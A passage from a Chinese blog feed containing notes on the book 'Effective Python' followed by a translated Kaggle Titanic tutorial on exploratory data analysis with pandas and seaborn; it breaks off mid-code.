不同，容易误解</p><h3><span id="13-try-except-else-finally">13. <code>try/except/else/finally</code></span></h3><ol><li><code>finally</code>块：既要将异常向上传播，又要在异常发生时做清理工作</li><li><code>ry/except/else</code>：except使异常传播变得清晰，else便于自己处理代码</li></ol><h3><span id="14-jin-liang-yong-yi-chang-lai-biao-shi-te-shu-qing-kuang-er-bu-yao-fan-hui-none">14. 尽量用异常来表示特殊情况，而不要返回 <code>None</code></span></h3><p>比如除以0时，抛出异常</p><h3><span id="15-zai-bi-bao-zhong-shi-yong-wai-wei-zuo-yong-yu-zhong-de-bian-liang">15. 在闭包中使用外围作用域中的变量</span></h3><ol><li>Python3 获取闭包中的变量：<code>nonlocal</code>，但是<code>nonlocal</code>不能延伸到模块级别；</li><li>Python2 中可以使用可变值来实现，比如包含单个元素的列表。</li><li>除非函数简单，尽量不使用 <code>nonlocal</code></li></ol><h3><span id="16-kao-lu-yong-sheng-cheng-qi-gai-xie-zhi-jie-fan-hui-lie-biao-de-han-shu">16. 考虑用生成器改写直接返回列表的函数</span></h3><p><code>yield</code></p><h3><span id="17-zai-can-shu-shang-die-dai-shi-xu-yao-duo-jia-xiao-xin"><em>17. 在参数上迭代时需要多加小心</em></span></h3><ol><li>参数是迭代器时要多加注意；</li><li>迭代器协议：容器和迭代器，<code>iter</code>，<code>next</code></li><li><code>__iter__</code></li><li>判断是否为迭代器：<code>iter(target) == iter(target)</code> 为True，则为迭代器</li></ol><h3><span id="18-yong-shu-liang-ke-bian-de-wei-zhi-can-shu-jian-shao-shi-jue-hun-luan">18. 用数量可变的位置参数减少视觉混乱</span></h3><ol><li>星号参数（<code>*args</code>），<code>*</code>操作符</li><li>变长参数在传给函数时，总是先转化成元组，如果是生成器，注意内存使用；</li><li>添加新参数时，需要修改原来函数使用。可使用关键字形式指定的参数解决这个问题。</li></ol><h3><span id="19-yong-guan-jian-zi-can-shu-biao-da-ke-xuan-xing-wei">19. 用关键字参数表达可选行为</span></h3><ol><li>位置参数必必须出现在关键字之前；每个参数只能指定一次；</li><li>关键字参数；易读，可提供默认值，扩充参数方便；</li></ol><h3><span id="20-yong-none-he-wen-dang-zi-fu-chuan-miao-shu-ju-you-dong-tai-mo-ren-zhi-de-can-shu">20. 用<code>None</code>和文档字符串描述具有动态默认值的参数</span></h3><ol><li>参数的默认值，只会在程序加载模块并读到本函数的定义时评估一次，对于<code>&#123;&#125;</code>，<code>[]</code>等动态值会出现奇怪行为。</li></ol><h3><span id="21-yong-zhi-neng-yi-guan-jian-zhi-xing-shi-zhi-ding-de-can-shu-lai-que-bao-dai-ma-ming-xi">21. 用只能以关键值形式指定的参数来确保代码明晰</span></h3><p>Python 3 中：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">safe_division_before</span>(<span class="params">number, divisor, ignore_overflow=<span class="literal">False</span>, ignore_zero_divisor=<span class="literal">False</span></span>):</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>==&gt;</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">safe_division_after</span>(<span class="params">number, divisor, *, ignore_overflow=<span class="literal">False</span>, ignore_zero_divisor=<span class="literal">False</span></span>):</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p><code>*</code> 标识着位置参数结束，之后的参数只能以关键字形式指定。</p><h3><span id="22-jin-liang-yong-fu-zhu-lei-lai-wei-hu-cheng-xu-zhuang-tai-er-bu-yong-zi-dian-he-yuan-zu">22. 尽量用辅助类来维护程序状态，而不用字典和元组</span></h3><ol><li>不使用包含字典的字典或者过长的元组；</li><li>具名元组：<code>collections.namedtuple</code>；</li></ol><h3><span id="23-jian-dan-de-jie-kou-ying-gai-jie-shou-han-shu-er-bu-shi-lei-de-shi-li">23. 简单的接口应该接受函数，而不是类的实例</span></h3><ol><li>Python中的函数是一级对象，函数和方法可以像语言中的其他值那样传递和引用；</li><li>举例：<ul><li><code>list</code>类型的<code>sort</code>方法</li><li><code>defaultdict</code></li></ul></li><li><code>__call__</code> 使类的实例像普通函数那样调用；</li><li>如果要用函数保存状态，就应该定义新的类，并令其实现 <code>__call__</code> 方法，而不要定义带状态的闭包。</li></ol><h3><span id="24-yi-classmedtod-xing-shi-de-duo-tai-qu-tong-yong-di-gou-jian-dui-xiang">24. 以 <code>@classmedtod</code> 形式的多态去通用地构建对象</span></h3><ol><li>每个类只能有一个构造器，即 <code>__init__</code>；</li><li><code>@@classmedtod</code> 机制可以用一种与构造器相似的方式构造类对象；</li></ol><h3><span id="25-yong-super-chu-shi-hua-fu-lei">25. 用 <code>super</code> 初始化父类</span></h3><ol><li>Python采用标准的方法解析解析顺序来解决 <em>超类初始化次序</em> 和 <em>菱形继承问题</em>；</li><li><code>super</code> 在Python2和Python3不一致；</li></ol><p>Python 3 中以下两种方式效果相同</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Explicit</span>(<span class="title class_ inherited__">MyBaseClass</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="built_in">super</span>(__class__, self).__init__(value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Implicit</span>(<span class="title class_ inherited__">MyBaseClass</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(value)</span><br></pre></td></tr></table></figure><ol start="3"><li>总是应该使用内置的 <code>super</code> 函数来初始化父类；</li><li>类的 <code>mro</code> 方法可以查看方法解析顺序：<code>MyClass.mro()</code></li></ol><h3><span id="26-zhi-zai-shi-yong-mix-in-zu-jian-zhi-zuo-gong-ju-lei-shi-jin-xing-duo-chong-ji-cheng">26. 只在使用 Mix-in 组件制作工具类时进行多重继承</span></h3><ol><li>mix-in 是一种小型类，它只定义了其他类可能需要提供的一套附加方法，而不定义自己的实例属性，它也不要求使用者调用自己的 <code>__init__</code> 构造器；</li><li>能用 mix-in 组件实现的效果，就不要用多重继承来做；</li><li>将各个功能实现为可插拔的 mix-in 组件，然后让相关类继承自己需要的组件，即可定制该类实例所应具备的行为；</li><li>简单行为封装到 mix-in 组件中，然后用多个组件组合出复杂功能。</li></ol><h3><span id="27-duo-yong-public-shu-xing-shao-yong-private-shu-xing">27. 多用 public 属性，少用 private 属性</span></h3><ol><li>Python解释器无法严格保证 private 字段的私密性（Python中会将类的 private 属性名称变化为 <code>_&#123;类名称&#125;__&#123;原private属性名称&#125;</code>）；</li><li>不要盲目将属性设置为 private，而是一开始就做好规划，并允许子类更多地访问超类内部API；</li><li>多用 protected 属性，并在文档中将这些字段的合理用法告诉开发者，而不要试图用 private 属性来限制子类访问；</li><li>只有当子类不受自己控制时，才可考虑使用 private 属性避免冲突。</li></ol><h3><span id="28-ji-cheng-collections-abc-yi-shi-xian-zi-ding-yi-rong-qi-lei-xing">28. 继承 <code>collections.abc</code> 以实现自定义容器类型</span></h3><p>编写自定义容器类型时，从 <code>collections.abc</code> 模块的抽象基类中继承，那些基类可以确保子类具有适当的接口和行为。</p><h3><span id="49-wei-mei-ge-han-shu-lei-he-mo-kuai-bian-xie-wen-dang-zi-fu-chuan">49. 为每个函数、类和模块编写文档字符串</span></h3><ol><li>docstring</li></ol><h3><span id="54-mo-kuai-ji-bie-dai-ma-pei-zhi-bu-tong-de-bu-shu-huan-jing">54. 模块级别代码配置不同的部署环境</span></h3><ol><li>环境变量</li><li><code>os</code>，<code>sys</code></li></ol><h3><span id="55-yong-repr-shu-chu-diao-shi-xin-xi">55. 用 <code>repr</code> 输出调试信息</span></h3><ol><li><code>print</code> 易于阅读字符串</li><li><code>repr</code> 可供打印字符串，<code>eval</code> 还原为初始值</li><li>格式化字符串：<code>%s</code> =&gt; str; <code>%r</code> =&gt; repr</li><li><code>__repr__</code> 自定义可供打印字符串；</li><li><code>__dict__</code> 任意对象查询实例字典；</li></ol><p>示例：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">print</span>(5)</span></span><br><span class="line">5</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">print</span>(<span class="string">&#x27;5&#x27;</span>)</span></span><br><span class="line">5</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">print</span>(repr(5))</span></span><br><span class="line">5</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">print</span>(repr(<span class="string">&#x27;5&#x27;</span>))</span></span><br><span class="line">&#x27;5&#x27;</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">print</span>(<span class="string">&#x27;%s&#x27;</span> % 5)</span></span><br><span class="line">5</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">print</span>(<span class="string">&#x27;%s&#x27;</span> % <span class="string">&#x27;5&#x27;</span>)</span></span><br><span class="line">5</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">print</span>(<span class="string">&#x27;%r&#x27;</span> % 5)</span></span><br><span class="line">5</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">print</span>(<span class="string">&#x27;%r&#x27;</span> % <span class="string">&#x27;5&#x27;</span>)</span></span><br><span class="line">&#x27;5&#x27;</span><br></pre></td></tr></table></figure><h3><span id="56-unittest-ce-shi">56. unittest 测试</span></h3><p>要确保 Python 程序能正常运行，唯一的方法就是编写测试。Python 语言动态特性，一方面阻碍了静态类型检测，另一方面却有利于开发者进行测试。</p><ol><li>断言（assertion）：<code>assertEqual</code>，<code>assertTrue</code>，<code>assertRaises</code></li><li>mock</li><li><code>setUp</code>，<code>tearDown</code></li><li>单元测试，集成测试</li></ol><h3><span id="57-pdb-jiao-hu-diao-shi">57. <code>pdb</code> 交互调试</span></h3><p><code>import pdb; pdb.set_trace()</code></p><ol><li><code>bt</code>，<code>up</code>，<code>down</code></li><li><code>step</code>，<code>next</code>，<code>return</code>，<code>continue</code></li></ol><h3><span id="58-xing-neng-fen-xi">58. 性能分析</span></h3><ol><li>Python 性能分析工具 <code>profile</code>：<code>profile</code>，<code>cProfile</code></li><li><code>runcall</code></li><li><code>Stats</code></li></ol><h3><span id="59-tracemalloc-nei-cun-shi-yong-ji-xie-lou">59. <code>tracemalloc</code> 内存使用及泄漏</span></h3><p>CPyhton：引用计数，gc</p><ol><li><code>gc.get_objects()</code></li><li><code>tracemalloc.take_snapshot()</code></li></ol><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      《编写高质量Python代码的59个有效方法》笔记
    
    </summary>
    
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>如何在 Titanic Kaggle Challenge 中获得0.8134分</title>
    <link href="https://qiwihui.com/qiwihui-blog-55/"/>
    <id>https://qiwihui.com/qiwihui-blog-55/</id>
    <published>2019-12-02T10:14:46.000Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>原文：<a href="https://ahmedbesbes.com/how-to-score-08134-in-titanic-kaggle-challenge.html">How to score 0.8134 in Titanic Kaggle Challenge</a></p><p>由 Kaggle 主持的<a href="https://www.kaggle.com/c/titanic/">泰坦尼克号生存挑战赛</a>是一项竞赛，其目标是基于一组描述乘客的变量，例如他的年龄，性别或乘客在船上的等级，来预测特定乘客是生存或死亡。</p><p>我一直在玩 Titanic 数据集，我最近在公共排行榜上获得了0.8134的准确度分数。当我写这篇文章时，我在所有 Kagglers 中排名前4％。</p><p><img src="https://raw.githubusercontent.com/qiwihui/How-to-score-0.8134-in-Titanic-Kaggle-Challenge/master/images/article_1/score.png" alt="png"></p><p>这篇文章将分享我的解决方案。</p><p>为了使本教程更具“学术性”以便任何人都能从中受益，我将首先从探索性数据分析（EDA）开始，然后我将遵循特征工程并最终呈现我设置的预测模型。</p><span id="more"></span><p>在这个 jupyter 笔记本中，我将在每个级别的管道中使用 Python。</p><p>本教程涉及的主要库是：</p><ul><li><strong>Pandas</strong> 用于数据操作和接入（ingestion）</li><li><strong>Matplotlib</strong> 和 <strong>seaborn</strong> 用于数据可视化</li><li><strong>Numpy</strong> 用于多维数组计算</li><li><strong>sklearn</strong> 用于机器学习和预测建模</li></ul><h3><span id="an-zhuang-guo-cheng">安装过程</span></h3><p>安装这些软件包的一种非常简单的方法是下载并安装 <a href="href=%22http://conda.pydata.org/docs/install/quick.html#os-x-miniconda-install">Conda</a>，它是将以上所有包封装起来的发行版。此发行版适用于所有平台（Windows，Linux 和 Mac OSX）。</p><h3><span id="te-bie-zhu-yi">特别注意</span></h3><p>这是我作为博主和机器学习从业者的第一次尝试。</p><p>如果您对我所做的代码或假设有疑问，请不要犹豫，在下面的评论部分发表评论。</p><p>如果您对如何改进笔记本电脑也有建议，请联系我。</p><p>本教程可在我的 <a href="https://github.com/ahmedbesbes/How-to-score-0.8134-in-Titanic-Kaggle-Challenge">github</a> 帐户中找到。</p><blockquote><p>译者注：本翻译在 <a href="https://github.com/qiwihui/How-to-score-0.8134-in-Titanic-Kaggle-Challenge">qiwihui</a> 下。</p></blockquote><p>希望你已经在计算机上设置了所有内容。让我们开始吧。</p><h2><span id="i-tan-suo-xing-shu-ju-fen-xi">I - 探索性数据分析</span></h2><p>正如在不同的数据项目中，我们将首先开始深入研究数据并建立我们的第一个直觉。</p><p>在本节中，我们将做四件事。</p><ul><li>数据提取：我们将加载数据集并首先查看它。</li><li>清洁：我们将填写缺失值。</li><li>绘图：我们将创建一些有趣的图表，这些图表（希望）可以发现数据中的相关性和隐藏的见解。</li><li>假设：我们将从图表中提出假设。</li></ul><p>我们稍微调整了这款笔记本的风格，以便画图居中。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> IPython.core.display <span class="keyword">import</span> HTML</span><br><span class="line">HTML(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;style&gt;</span></span><br><span class="line"><span class="string">.output_png &#123;</span></span><br><span class="line"><span class="string">    display: table-cell;</span></span><br><span class="line"><span class="string">    text-align: center;</span></span><br><span class="line"><span class="string">    vertical-align: middle;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&lt;/style&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>);</span><br></pre></td></tr></table></figure><p>导入有用的包。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">%matplotlib inline</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">warnings.filterwarnings(<span class="string">&#x27;ignore&#x27;</span>, category=DeprecationWarning)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">pd.options.display.max_columns = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pylab <span class="keyword">as</span> plot</span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&#x27;axes.labelsize&#x27;</span>: <span class="string">&quot;large&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;xtick.labelsize&#x27;</span>: <span class="string">&#x27;x-large&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;legend.fontsize&#x27;</span>: <span class="number">20</span>,</span><br><span class="line">    <span class="string">&#x27;figure.dpi&#x27;</span>: <span class="number">150</span>,</span><br><span class="line">    <span class="string">&#x27;figure.figsize&#x27;</span>: [<span class="number">25</span>, <span class="number">7</span>]</span><br><span class="line">&#125;</span><br><span class="line">plot.rcParams.update(params)</span><br></pre></td></tr></table></figure><p>有两个数据集：训练集和测试集。我们将使用训练集来构建我们的预测模型，用测试集来对其进行评分并生成输出文件以在Kaggle评估系统上提交。</p><p>我们将在本文末尾看到这个过程是如何完成的。</p><p>现在让我们开始加载训练集。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = pd.read_csv(<span class="string">&#x27;./data/train.csv&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> data.shape</span><br></pre></td></tr></table></figure><pre><code>(891, 12)</code></pre><p>我们得到:</p><ul><li>891 行</li><li>12 列</li></ul><p>Pandas 允许你鸟瞰数据。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data.head()</span><br></pre></td></tr></table></figure><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>PassengerId</th>      <th>Survived</th>      <th>Pclass</th>      <th>Name</th>      <th>Sex</th>      <th>Age</th>      <th>SibSp</th>      <th>Parch</th>      <th>Ticket</th>      <th>Fare</th>      <th>Cabin</th>      <th>Embarked</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>1</td>      <td>0</td>      <td>3</td>      <td>Braund, Mr. Owen Harris</td>      <td>male</td>      <td>22.0</td>      <td>1</td>      <td>0</td>      <td>A/5 21171</td>      <td>7.2500</td>      <td>NaN</td>      <td>S</td>    </tr>    <tr>      <th>1</th>      <td>2</td>      <td>1</td>      <td>1</td>      <td>Cumings, Mrs. John Bradley (Florence Briggs Th...</td>      <td>female</td>      <td>38.0</td>      <td>1</td>      <td>0</td>      <td>PC 17599</td>      <td>71.2833</td>      <td>C85</td>      <td>C</td>    </tr>    <tr>      <th>2</th>      <td>3</td>      <td>1</td>      <td>3</td>      <td>Heikkinen, Miss. Laina</td>      <td>female</td>      <td>26.0</td>      <td>0</td>      <td>0</td>      <td>STON/O2. 3101282</td>      <td>7.9250</td>      <td>NaN</td>      <td>S</td>    </tr>    <tr>      <th>3</th>      <td>4</td>      <td>1</td>      <td>1</td>      <td>Futrelle, Mrs. Jacques Heath (Lily May Peel)</td>      <td>female</td>      <td>35.0</td>      <td>1</td>      <td>0</td>      <td>113803</td>      <td>53.1000</td>      <td>C123</td>      <td>S</td>    </tr>    <tr>      <th>4</th>      <td>5</td>      <td>0</td>      <td>3</td>      <td>Allen, Mr. William Henry</td>      <td>male</td>      <td>35.0</td>      <td>0</td>      <td>0</td>      <td>373450</td>      <td>8.0500</td>      <td>NaN</td>      <td>S</td>    </tr>  </tbody></table><p><code>Survived</code> 列是 <strong>目标变量</strong>。 如果 <code>Survived</code> 为 1，乘客幸免于难，否则他已经死了。这是我们要预测的变量。</p><p>其他变量描述了乘客。 它们是 <strong>特征</strong>。</p><ul><li><code>PassengerId</code>：船上每位旅客的身份证明</li><li><code>Pclass</code>：乘客等级。 它有三个可能的值：1，2，3（第一，第二和第三类）</li><li><code>Name</code>：Passeger的名字</li><li><code>Sex</code>：性别</li><li><code>Age</code>：年龄</li><li><code>SibSp</code>：与乘客一起旅行的兄弟姐妹和配偶的数量</li><li><code>Parch</code>：与乘客一起旅行的父母和孩子的数量</li><li><code>Ticket</code>：船票号码</li><li><code>Fare</code>：票价</li><li><code>Cabin</code>：船舱号码</li><li><code>Embarked</code>：这描述了人们登上的泰坦尼克号的三个可能区域。 三个可能的值 S，C，Q</li></ul><p>Pandas 允许您对数字特征进行高级简单的统计描述。这可以使用 <code>describe</code> 方法完成。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data.describe()</span><br></pre></td></tr></table></figure><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>PassengerId</th>      <th>Survived</th>      <th>Pclass</th>      <th>Age</th>      <th>SibSp</th>      <th>Parch</th>      <th>Fare</th>    </tr>  </thead>  <tbody>    <tr>      <th>count</th>      <td>891.000000</td>      <td>891.000000</td>      <td>891.000000</td>      <td>714.000000</td>      <td>891.000000</td>      <td>891.000000</td>      <td>891.000000</td>    </tr>    <tr>      <th>mean</th>      <td>446.000000</td>      <td>0.383838</td>      <td>2.308642</td>      <td>29.699118</td>      <td>0.523008</td>      <td>0.381594</td>      <td>32.204208</td>    </tr>    <tr>      <th>std</th>      <td>257.353842</td>      <td>0.486592</td>      <td>0.836071</td>      <td>14.526497</td>      <td>1.102743</td>      <td>0.806057</td>      <td>49.693429</td>    </tr>    <tr>      <th>min</th>      <td>1.000000</td>      <td>0.000000</td>      <td>1.000000</td>      <td>0.420000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>    </tr>    <tr>      <th>25%</th>      <td>223.500000</td>      <td>0.000000</td>      <td>2.000000</td>      <td>20.125000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>7.910400</td>    </tr>    <tr>      <th>50%</th>      <td>446.000000</td>      <td>0.000000</td>      <td>3.000000</td>      <td>28.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>14.454200</td>    </tr>    <tr>      <th>75%</th>      <td>668.500000</td>      <td>1.000000</td>      <td>3.000000</td>      <td>38.000000</td>      <td>1.000000</td>      <td>0.000000</td>      <td>31.000000</td>    </tr>    <tr>      <th>max</th>      <td>891.000000</td>      <td>1.000000</td>      <td>3.000000</td>      <td>80.000000</td>      <td>8.000000</td>      <td>6.000000</td>      <td>512.329200</td>    </tr>  </tbody></table><p><code>count</code> 变量显示 <code>Age</code> 列中缺少177个值。</p><p>一种解决方案是用中值年龄填充空值。我们也可以用平均年龄来估算，但中位数对异常值更为稳健。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data[<span class="string">&#x27;Age&#x27;</span>] = data[<span class="string">&#x27;Age&#x27;</span>].fillna(data[<span class="string">&#x27;Age&#x27;</span>].median())</span><br></pre></td></tr></table></figure><p>让我们看一下结果。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data.describe()</span><br></pre></td></tr></table></figure><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>PassengerId</th>      <th>Survived</th>      <th>Pclass</th>      <th>Age</th>      <th>SibSp</th>      <th>Parch</th>      <th>Fare</th>    </tr>  </thead>  <tbody>    <tr>      <th>count</th>      <td>891.000000</td>      <td>891.000000</td>      <td>891.000000</td>      <td>891.000000</td>      <td>891.000000</td>      <td>891.000000</td>      <td>891.000000</td>    </tr>    <tr>      <th>mean</th>      <td>446.000000</td>      <td>0.383838</td>      <td>2.308642</td>      <td>29.361582</td>      <td>0.523008</td>      <td>0.381594</td>      <td>32.204208</td>    </tr>    <tr>      <th>std</th>      <td>257.353842</td>      <td>0.486592</td>      <td>0.836071</td>      <td>13.019697</td>      <td>1.102743</td>      <td>0.806057</td>      <td>49.693429</td>    </tr>    <tr>      <th>min</th>      <td>1.000000</td>      <td>0.000000</td>      <td>1.000000</td>      <td>0.420000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>    </tr>    <tr>      <th>25%</th>      <td>223.500000</td>      <td>0.000000</td>      <td>2.000000</td>      <td>22.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>7.910400</td>    </tr>    <tr>      <th>50%</th>      <td>446.000000</td>      <td>0.000000</td>      <td>3.000000</td>      <td>28.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>14.454200</td>    </tr>    <tr>      <th>75%</th>      <td>668.500000</td>      <td>1.000000</td>      <td>3.000000</td>      <td>35.000000</td>      <td>1.000000</td>      <td>0.000000</td>      <td>31.000000</td>    </tr>    <tr>      <th>max</th>      <td>891.000000</td>      <td>1.000000</td>      <td>3.000000</td>      <td>80.000000</td>      <td>8.000000</td>      <td>6.000000</td>      <td>512.329200</td>    </tr>  </tbody></table><p>完美。</p><p>我们现在制作一些图表。让我们根据性别来看待生存。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data[<span class="string">&#x27;Died&#x27;</span>] = <span class="number">1</span> - data[<span class="string">&#x27;Survived&#x27;</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data.groupby(<span class="string">&#x27;Sex&#x27;</span>).agg(<span class="string">&#x27;sum&#x27;</span>)[[<span class="string">&#x27;Survived&#x27;</span>, <span class="string">&#x27;Died&#x27;</span>]].plot(kind=<span class="string">&#x27;bar&#x27;</span>, figsize=(<span class="number">25</span>, <span class="number">7</span>),</span><br><span class="line">                                                          stacked=<span class="literal">True</span>, colors=[<span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;r&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qiwihui/How-to-score-0.8134-in-Titanic-Kaggle-Challenge/master/images/article_1/1.png" alt="png"></p><p>看起来男性乘客更容易死亡。让我们绘制相同的图形，但用比例代替。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data.groupby(<span class="string">&#x27;Sex&#x27;</span>).agg(<span class="string">&#x27;mean&#x27;</span>)[[<span class="string">&#x27;Survived&#x27;</span>, <span class="string">&#x27;Died&#x27;</span>]].plot(kind=<span class="string">&#x27;bar&#x27;</span>, figsize=(<span class="number">25</span>, <span class="number">7</span>), </span><br><span class="line">                                                           stacked=<span class="literal">True</span>, colors=[<span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;r&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qiwihui/How-to-score-0.8134-in-Titanic-Kaggle-Challenge/master/images/article_1/2.png" alt="png"></p><p>性别变量似乎是一种歧视性特征。女性更有可能生存。</p><p>现在让我们将生存与年龄变量联系起来。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fig = plt.figure(figsize=(<span class="number">25</span>, <span class="number">7</span>))</span><br><span class="line">sns.violinplot(x=<span class="string">&#x27;Sex&#x27;</span>, y=<span class="string">&#x27;Age&#x27;</span>, </span><br><span class="line">               hue=<span class="string">&#x27;Survived&#x27;</span>, data=data, </span><br><span class="line">               split=<span class="literal">True</span>,</span><br><span class="line">               palette=&#123;<span class="number">0</span>: <span class="string">&quot;r&quot;</span>, <span class="number">1</span>: <span class="string">&quot;g&quot;</span>&#125;</span><br><span class="line">              );</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qiwihui/How-to-score-0.8134-in-Titanic-Kaggle-Challenge/master/images/article_1/3.png" alt="png"></p><p>正如我们在上面的图表中看到并通过以下方式验证：</p><ul><li>女性的生存率高于男性，如较大的女性绿色直方图所示</li></ul><p>现在，我们看到：</p><ul><li><p>年龄为男性乘客的生存：</p><ul><li>年轻的男性倾向于生存  * 20至40岁之间的大量乘客死亡</li></ul></li><li><p>年龄似乎没有对女性生存产生直接影响</p></li></ul><p>以下小提琴情节证实，在遇到威胁的情况下，水手和船长遵守一条旧的行为准则：“<strong>妇女和儿童优先！</strong>”。</p><p><img src="https://raw.githubusercontent.com/qiwihui/How-to-score-0.8134-in-Titanic-Kaggle-Challenge/master/images/article_1/titanic.jpg" alt="png"></p><p>对吗？</p><p>现在让我们关注每位乘客的票价，看看它如何影响生存。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">figure = plt.figure(figsize=(<span class="number">25</span>, <span class="number">7</span>))</span><br><span class="line">plt.hist([data[data[<span class="string">&#x27;Survived&#x27;</span>] == <span class="number">1</span>][<span class="string">&#x27;Fare&#x27;</span>], data[data[<span class="string">&#x27;Survived&#x27;</span>] == <span class="number">0</span>][<span class="string">&#x27;Fare&#x27;</span>]], </span><br><span class="line">         stacked=<span class="literal">True</span>, color = [<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;r&#x27;</span>],</span><br><span class="line">         bins = <span class="number">50</span>, label = [<span class="string">&#x27;Survived&#x27;</span>,<span class="string">&#x27;Dead&#x27;</span>])</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Fare&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Number of passengers&#x27;</span>)</span><br><span class="line">plt.legend();</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qiwihui/How-to-score-0.8134-in-Titanic-Kaggle-Challenge/master/images/article_1/4.png" alt="png"></p><p>票价较低的乘客更容易死亡。换句话说，拥有更昂贵门票，因此更重要的社会地位的乘客似乎首先获救。</p><p>好的，这很好。 现在让我们将年龄，票价和生存结合在一张图表上。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.figure(figsize=(<span class="number">25</span>, <span class="number">7</span>))</span><br><span class="line">ax = plt.subplot()</span><br><span class="line"></span><br><span class="line">ax.scatter(data[data[<span class="string">&#x27;Survived&#x27;</span>] == <span class="number">1</span>][<span class="string">&#x27;Age&#x27;</span>], data[data[<span class="string">&#x27;Survived&#x27;</span>] == <span class="number">1</span>][<span class="string">&#x27;Fare&#x27;</span>], </span><br><span class="line">           c=<span class="string">&#x27;green&#x27;</span>, s=data[data[<span class="string">&#x27;Survived&#x27;</span>] == <span class="number">1</span>][<span class="string">&#x27;Fare&#x27;</span>])</span><br><span class="line">ax.scatter(data[data[<span class="string">&#x27;Survived&#x27;</span>] == <span class="number">0</span>][<span 